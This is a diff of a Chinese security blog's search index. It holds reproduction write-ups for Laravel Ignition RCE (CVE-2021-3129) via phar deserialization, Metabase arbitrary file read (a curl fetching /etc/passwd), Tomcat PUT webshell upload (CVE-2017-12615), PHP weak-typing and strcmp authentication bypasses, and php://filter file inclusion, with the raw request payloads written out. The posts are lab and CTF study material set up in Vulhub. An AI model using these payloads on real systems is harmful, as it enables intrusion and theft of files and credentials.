2=00=68=00=6C=00=62=00=47=00=77=00=75=00=63=00=47=00=68=00=77=00=4A=00=79=00=6B=00=37=00=49=00=47=00=56=00=34=00=61=00=58=00=51=00=37=00=49=00=44=00=38=00=2B=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=41=00=4C=00=66=00=39=00=5A=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=33=00=4E=00=42=00=31=00=67=00=64=00=5A=00=36=00=2B=00=50=00=59=00=72=00=34=00=36=00=79=00=42=00=34=00=71=00=67=00=63=00=67=00=4F=00=4C=00=74=00=59=00=37=00=77=00=43=00=41=00=41=00=41=00=41=00=52=00=30=00=4A=00=4E=00=51=00=67=00=3D=00=3D=00a&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>5.清除干扰字符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>6.执行反序列化<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>发送完以上数据包后，蚁剑进行连接，成功连接</p>
-<p><img src="/images/image-20230910203844643.png" alt="image-20230910203844643"></p>
-<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这里也可直接使用工具生成webshell进行连接(这里使用的是哥斯拉)</p>
-<p>github地址：<a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP" target="_blank" rel="noopener">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
-<p><img src="https://img-blog.csdnimg.cn/4459b03ef53f41acab26d864a976a9ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaOmihuWwj-eZveW4vQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<p><img src="/images/image-20230910204850323.png" alt="image-20230910204850323"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>使用了file_get_contents()去读取了一个可控的路径参数，所以这里可以通过phar://协议去触发phar反序列化</p>
-<p>既然路径可控，那么首先想到的就是log文件，虽然log不能直接被当做php执行，但是有了file_get_contents+phar就可以；我们修改可控的viewfile参数后看看log中是什么样的</p>
-<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/ez9hcsiijj.png" alt="img"></p>
-<p><img src="https://ask.qcloudimg.com/http-save/yehe-5605816/kyb4hlb7rv.png" alt="img"></p>
-<p>可以看到日志中写入了3次test，那么怎么才能只保留我们最后的一个payload呢，这里就可以使用filter做清空字符以及去除多余字符的方法。</p>
-<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.使用白名单限制相关web项目的访问来降低风险；</p>
-<p>2.将 Laravel 框架升级至8.4.3及其以上版本，或者将facade ignition组件升级至 2.5.2 及其以上版本。</p>
-<p><strong>参考链接：</strong></p>
-<p><a href="https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/qTZ9WFFmATk3Hu3Sb9uQzA</a></p>
-<p><a href="https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</a></p>
-<p><a href="https://www.ambionics.io/blog/laravel-debug-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/laravel-debug-rce</a></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>代码执行</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Jetty WEB-INF 敏感信息泄露漏洞 CVE-2021-34429</title>
     <url>/2022/11/17/Jetty%20WEB-INF%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2021-34429/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Eclipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。</p>
@@ -647,6 +548,33 @@
       </tags>
   </entry>
   <entry>
+    <title>Metabase任意文件读取漏洞（CVE-2021-41277）</title>
+    <url>/2023/02/11/Metabase%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41277%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr" target="_blank" rel="noopener">https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr</a></li>
+<li><a href="https://github.com/tahtaciburak/CVE-2021-41277" target="_blank" rel="noopener">https://github.com/tahtaciburak/CVE-2021-41277</a></li>
+</ul>
+<a id="more"></a>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">metabase 0.40.0-0.40.4</span><br></pre></td></tr></table></figure>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+<p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码（自己设置），并且跳过后续的数据库填写的步骤即可完成安装：</p>
+<p><img src="/images/image-20230910215922566.png" alt="image-20230910215922566"></p>
+<p><img src="/images/image-20230910215943458.png" alt="image-20230910215943458"></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/images/image-20230910220202228.png" alt="image-20230910220202228"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>任意文件读取</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Nacos 认证绕过漏洞（CVE-2021-29441）</title>
     <url>/2023/03/01/Nacos%20%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-29441%EF%BC%89/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。</p>
@@ -683,211 +611,6 @@
       </categories>
       <tags>
         <tag>Nacos 认证绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Metabase任意文件读取漏洞（CVE-2021-41277）</title>
-    <url>/2023/02/11/Metabase%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41277%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Metabase是一个开源的数据分析平台。在其<strong>0.40.0到0.40.4版本</strong>中，GeoJSON URL验证功能存在远程文件读取漏洞，未授权的攻击者可以利用这个漏洞读取服务器上的任意文件，包括环境变量等。</p>
-<p>参考链接：</p>
-<ul>
-<li><a href="https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr" target="_blank" rel="noopener">https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr</a></li>
-<li><a href="https://github.com/tahtaciburak/CVE-2021-41277" target="_blank" rel="noopener">https://github.com/tahtaciburak/CVE-2021-41277</a></li>
-</ul>
-<a id="more"></a>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">metabase 0.40.0-0.40.4</span><br></pre></td></tr></table></figure>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Vulhub执行如下命令启动一个Metabase 0.40.4版本服务器：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-<p>服务启动后，访问<code>http://your-ip:3000</code>可以查看到Metabase的安装引导页面，我们填写初始账号密码（自己设置），并且跳过后续的数据库填写的步骤即可完成安装：</p>
-<p><img src="/images/image-20230910215922566.png" alt="image-20230910215922566"></p>
-<p><img src="/images/image-20230910215943458.png" alt="image-20230910215943458"></p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>执行以下命令读取<code>/etc/passwd</code>：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http://your-ip:3000/api/geojson?url=file:////etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/images/image-20230910220202228.png" alt="image-20230910220202228"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>任意文件读取</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php</title>
-    <url>/2018/08/10/php/</url>
-    <content><![CDATA[<p>php的详细使用可以参考<a href="http://php.net/manual/zh/" target="_blank" rel="noopener">http://php.net/manual/zh/</a></p>
-<p>php关于==号是这样处理的，如果一边是整型，另一边也需要是整型。</p>
-<a id="more"></a>
-<pre><code>0e545993274517709034328855841020
-</code></pre><p>这是一个整数，在php里是理解为0*10^4549…20的意思，那么其值是0</p>
-<p>同样</p>
-<pre><code>0e342768416822451524974117254469
-</code></pre><p>这是一个整数，在php里是理解为0*10^34..69的意思，那么其值是0，两者就相等了</p>
-<p>举一个反面的例子</p>
-<p>1e1和1e2</p>
-<p>这里1e1=1<em>10^1=10，1e2=1</em>10^2=100</p>
-<p>所以1e1 == 1e2这是false，但是</p>
-<p>100 == 1e2 这是true，为什么呢，因为1e2先转为整型，是100</p>
-<p>注意，对于e是指幂次。而其他26字符并不具有此能力。</p>
-<p>参考：</p>
-<p><a href="http://php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.operators.comparison.php</a></p>
-<pre><code>&lt;?php
-var_dump(0 == &quot;all&quot;); // 0 == 0 -&gt; true
-var_dump(&quot;1&quot; == &quot;01&quot;); // 1 == 1 -&gt; true
-var_dump(&quot;10&quot; == &quot;1e1&quot;); // 10 == 10 -&gt; true
-var_dump(100 == &quot;1e2&quot;); // 100 == 100 -&gt; true
-
-switch (&quot;a&quot;) {
-case 0:
-    echo &quot;0&quot;;
-    break;
-case &quot;a&quot;: // never reached because &quot;a&quot; is already matched with 0
-    echo &quot;a&quot;;
-    break;
-}
-?&gt;
-</code></pre><p>做比较，会先转换类型， all字符串转换成数字类型(int)就是 0 ， 所以中间成立返回真。</p>
-<pre><code>var_dump(08==8)这个结果返回是false，
-var_dump(09==9)这个结果返回也是false，
-而var_dump(07===7)返回true（var_dump(07==7)同样返回true。）
-</code></pre><p>php手册上有详细说明，整形以0开头的为八进制数，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略，即09实际上为0，08也同理</p>
-]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</title>
-    <url>/2022/10/18/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
-    <content><![CDATA[<p>Tomcat版本：8.5.19</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/tomcat/CVE-2017-12615/</span><br><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
-<p>运行完成后访问<code>http://your-ip:8080</code>即可看到Tomcat的Example页面。</p>
-<a id="more"></a>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>参考：</p>
-<ul>
-<li><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</a></li>
-<li><a href="https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&amp;mid=2247483805&amp;idx=1&amp;sn=503a3e29165d57d3c20ced671761bb5e</a></li>
-</ul>
-<p>漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
-<p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接连接到docker开启的tomcat环境，文件直接上传到docker里面的那个tomcat中</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">直接发送以下数据包即可在Web根目录写入shell：</span><br><span class="line"></span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
-<p>PUT方法向Tomcat中上传冰蝎马</p>
-<p><img src="/images/image-20230919094810254.png" alt="image-20230919094810254"></p>
-<p><img src="/images/image-20230919094820779.png" alt="image-20230919094820779"></p>
-<p>冰蝎连接</p>
-<p><img src="/images/image-20230919133124835.png" alt="image-20230919133124835"></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>php弱类型</title>
-    <url>/2018/11/04/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
-    <content><![CDATA[<h2 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h2><p>php中有两种比较的符号 == 与 ===</p>
-<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较，如果类型不同直接返回不相等</p>
-<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
-<a id="more"></a>
-<p>（如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行），例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 var_dump(&quot;admin&quot;==0);  //true</span><br><span class="line">3 var_dump(&quot;1admin&quot;==1); //true</span><br><span class="line">4 var_dump(&quot;admin1&quot;==1) //false</span><br><span class="line">5 var_dump(&quot;admin1&quot;==0) //true</span><br><span class="line">6 var_dump(&quot;0e123456&quot;==&quot;0e4456789&quot;); //true </span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
-<p>观察上述代码，得到：</p>
-<p>1、”admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等</p>
-<p>2、”1admin”==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是”admin1”被转化成了0</p>
-<p>3、 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
-<p>==注意 #f44336==：</p>
-<p>当一个字符串被当作一个数值来取值，其结果和类型如下:</p>
-<p>如果该字符串没有包含’.’,’e’,’E’并且其数值在整形的范围之内，该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
-<p>例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $test=1 + &quot;10.5&quot;; // $test=11.5(float)</span><br><span class="line">3 $test=1+&quot;-1.3e3&quot;; //$test=-1299(float)</span><br><span class="line">4 $test=1+&quot;bob-1.3e3&quot;;//$test=1(int)</span><br><span class="line">5 $test=1+&quot;2admin&quot;;//$test=3(int)</span><br><span class="line">6 $test=1+&quot;admin2&quot;;//$test=1(int)</span><br><span class="line">7 ?&gt;</span><br></pre></td></tr></table></figure>
-<p>所以就解释了”admin1”==1 =&gt;False 的原因</p>
-<h2 id="md5绕过-Hash比较缺陷"><a href="#md5绕过-Hash比较缺陷" class="headerlink" title="md5绕过(Hash比较缺陷)"></a>md5绕过(Hash比较缺陷)</h2><p>md5开头是0e的字符串，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0，md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过，例如：</p>
-<p>QNKCDZO<br>0e830400451993494058024219903391</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s155964671a<br>0e342768416822451524974117254469</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s214587387a<br>0e848240448830537924465865611904</p>
-<p>s878926199a<br>0e545993274517709034328855841020</p>
-<p>s1091221200a<br>0e940624217856561557816327384675</p>
-<h2 id="json绕过"><a href="#json绕过" class="headerlink" title="json绕过"></a>json绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&apos;message&apos;])) &#123;</span><br><span class="line">    $message = json_decode($_POST[&apos;message&apos;]);</span><br><span class="line">    $key =&quot;*********&quot;;</span><br><span class="line">    if ($message-&gt;key == $key) &#123;</span><br><span class="line">        echo &quot;flag&quot;;</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;fail&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo &quot;~~~~&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”(字符串)这种形式绕过</p>
-<p>最终上传 message={“key”:0}</p>
-<h2 id="array-search-is-array绕过"><a href="#array-search-is-array绕过" class="headerlink" title="array_search / is_array绕过"></a>array_search / is_array绕过</h2><p>in_array和array_search会对类型进行强制转换，并且是==进行比较，所以可以绕过。</p>
-<p>mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] )</p>
-<p>$needle，$haystack必需，$strict可选  函数判断$haystack中的值是否存在$needle，存在则返回该值的键值 第三个参数默认为false，如果设置为true则会进行严格过滤</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 &lt;?php</span><br><span class="line">2 $a=array(0,1);</span><br><span class="line">3 var_dump(array_search(&quot;admin&quot;,$a)); // int(0) =&gt; 返回键值0</span><br><span class="line">4 var_dump(array_seach(&quot;1admin&quot;,$a));  // int(1) ==&gt;返回键值1</span><br><span class="line">5 ?&gt;</span><br></pre></td></tr></table></figure>
-<p>array_search函数 类似于== 也就是$a==”admin” 当然是$a=0  当然如果第三个参数为true则就不能绕过</p>
-<h2 id="strcmp漏洞绕过"><a href="#strcmp漏洞绕过" class="headerlink" title="strcmp漏洞绕过"></a>strcmp漏洞绕过</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1 &lt;?php</span><br><span class="line"> 2     $password=&quot;***************&quot;</span><br><span class="line"> 3      if(isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line"> 4 </span><br><span class="line"> 5         if (strcmp($_POST[&apos;password&apos;], $password) == 0) &#123;</span><br><span class="line"> 6             echo &quot;Right!!!login success&quot;;n</span><br><span class="line"> 7             exit();</span><br><span class="line"> 8         &#125; else &#123;</span><br><span class="line"> 9             echo &quot;Wrong password..&quot;;</span><br><span class="line">10         &#125;</span><br><span class="line">11 ?&gt;</span><br></pre></td></tr></table></figure>
-<p>strcmp是比较两个字符串，如果str1&lt;str2 则返回<0 如果str1大于str2返回="">0 如果两者相等 返回0</0></p>
-<p>我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢</p>
-<p>我们传入 password[]=xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断相等</p>
-<h2 id="empty和isset函数"><a href="#empty和isset函数" class="headerlink" title="empty和isset函数"></a>empty和isset函数</h2><p>1）变量为：0，”0”,null,’’,false,array()时，使用empty函数，返回的都为true</p>
-<p>2）变量未定义或者为null时，isset函数返回的为false,其他都未true</p>
-<p>例如：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a = null;</span><br><span class="line">$b = &apos;&apos;;</span><br><span class="line">$c = 0;</span><br><span class="line">$d = &quot;0&quot;;</span><br><span class="line">$e = false;</span><br><span class="line">$f = array();</span><br><span class="line">var_dump(empty($a));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(empty($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line"></span><br><span class="line">var_dump(isset($a));   //false</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($b));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($c));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($d));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($e));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($f));   //true</span><br><span class="line">echo &apos;&lt;p&gt;&apos;;</span><br><span class="line">var_dump(isset($g));   //false</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>php</category>
-      </categories>
-      <tags>
-        <tag>php弱类型</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含</title>
-    <url>/2018/09/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="南邮文件包含ctf题"><a href="#南邮文件包含ctf题" class="headerlink" title="南邮文件包含ctf题"></a>南邮文件包含ctf题</h2><p><img src="https://i.imgur.com/5QJFWhR.png" alt=""></p>
-<a id="more"></a>
-<hr>
-<p><img src="https://i.imgur.com/7vQRioW.png" alt=""></p>
-<p><img src="https://i.imgur.com/gUBH2rU.png" alt=""></p>
-<p>PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，<br>从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。最常见的就属于本地文件包含（Local File Inclusion）漏洞了。</p>
-<p>详细的本地文件包含漏洞介绍： <a href="https://www.cnblogs.com/wh4am1/p/6542398.html" target="_blank" rel="noopener">https://www.cnblogs.com/wh4am1/p/6542398.html</a></p>
-<p>我们从第三幅图中很明显的看出这是个php文件，但是无法通过查看源码得到有效信息，因此尝试使用php://filter获取源码。</p>
-<p>php://filter是PHP中的一个协议，利用这个协议我们可以解决一些ctf的题目，或者挖掘出一些漏洞。</p>
-<pre><code>php:// — 访问各个输入/输出流（I/O streams）php://input 是个可以访问请求的原始数据的只读流。
-
-php://filter 是一种设计用来允许过滤器程序在打开时成为流的封装协议。这对于单独具有完整功能的文件函数非常有用，否则就没有机会在读取内容之前将过滤器应用于流之上。
-
-该协议语法为：php://filter:/&lt;action&gt;=&lt;name&gt;
-
-比如 php://filter:/resource=http://www.baidu.com
-</code></pre><h3 id="使用-php-filter-获取网页内容："><a href="#使用-php-filter-获取网页内容：" class="headerlink" title="使用 php://filter 获取网页内容："></a>使用 php://filter 获取网页内容：</h3><pre><code>&lt;?php$url = &apos;http://www.phpfamily.cn&apos;;$data = file_get_contents(&apos;php://filter/resource=&apos; . $url);
-
-echo $data;  //输出结果我http://www.phpfamily.cn页面的内容
-</code></pre><h3 id="php-filter-的参数列表"><a href="#php-filter-的参数列表" class="headerlink" title="php://filter 的参数列表"></a>php://filter 的参数列表</h3><ul>
-<li>resource=&lt;要过滤的数据流&gt;          指定了你要筛选过滤的数据流。     （必选）</li>
-<li>read=&lt;读链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li>
-<li>write=&lt;写链的筛选列表&gt;     可以设定一个或多个过滤器名称，以管道符（|）分隔。 （可选）</li>
-<li>&lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</li>
-</ul>
-<h3 id="read参数值可为"><a href="#read参数值可为" class="headerlink" title="read参数值可为"></a>read参数值可为</h3><p>string.strip_tags： 将数据流中的所有html标签清除</p>
-<p>string.toupper： 将数据流中的内容转换为大写</p>
-<p>string.tolower： 将数据流中的内容转换为小写</p>
-<p>convert.base64-encode： 将数据流中的内容转换为base64编码</p>
-<p>convert.base64-decode： 与上面对应解码为典型的文件包含漏洞。</p>
-<p>我们可以通过构造含有漏洞的语句，查看想要看的代码： file=php://filter/convert.base64-encode/resource=index.php 。再将得到的base64码解码即可。</p>
